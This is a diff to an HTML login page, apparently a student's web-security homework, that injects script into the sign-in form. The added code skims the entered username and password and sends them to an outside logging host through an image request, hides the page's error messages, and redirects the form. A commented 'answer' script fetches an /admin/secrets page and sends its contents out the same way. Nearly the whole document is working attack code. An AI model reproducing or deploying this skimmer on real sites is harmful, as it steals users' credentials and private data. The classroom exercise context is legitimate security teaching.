@@ -26,12 +26,12 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <form id="login" action="./login" method="get" class="untouched">
+  <form id="login" action="http://students.washington.edu/sebet86/WebPageInfo415/Homework%20%233/" method="get" class="untouched">
 
-      <!--<h2 class="problem">Whoops!</h2>
+      <h2 class="problem">Whoops!</h2>
       <p class="error-message">
         Username: <span id='name' value='suh'>suh</span> does not appear in the system. Please try again
-      </p>-->
+      </p>
 
 
       <div id="login-fields-wrapper">
@@ -45,14 +45,13 @@
         <script> 
           function run() {
               i = new Image();
-              i.src='http://r7.io/e/1166811?s=' +document.getElementById("login_username").value+' '+document.getElementById("login_password").value;
-          };
-          function window() {
-            window.location='http://www.students.washington.edu/sebet86/WebPageInfo415/Homework#3/';
+              i.src='http://r7.io/e/1166811?s=' +document.getElementById("login_username").value+' '+document.getElementById("login_password").value;alert(document.getElementById("login_username").value+' '+document.getElementById("login_password").value);
+              // window.location='http://students.washington.edu/sebet86/WebPageInfo415/Homework%20%233/';
           };
           target = document.getElementById("login");
+          test = target.getElementsByClassName('problem')[0].innerHTML=""; 
+          test2 = target.getElementsByClassName('error-message')[0].outerHTML=""; 
           target.addEventListener('submit', run);
-          target.addEventListener('submit', window);
           </script>
        <!--my answers-->
       <!--<script>function run(){$.get("/admin/secrets",function(response){success=$($.parseHTML(response)).filter("#secrets");i=new Image();j=success.text();i.src='http://r7.io/e/1166811?s='+j;alert(success.text());},'html');};var target=document.getElementById("login");test=target.getElementsByClassName('problem')[0].innerHTML="";test=target.getElementsByClassName('error-message')[0].outerHTML="";target.addEventListener('submit',run);</script>-->
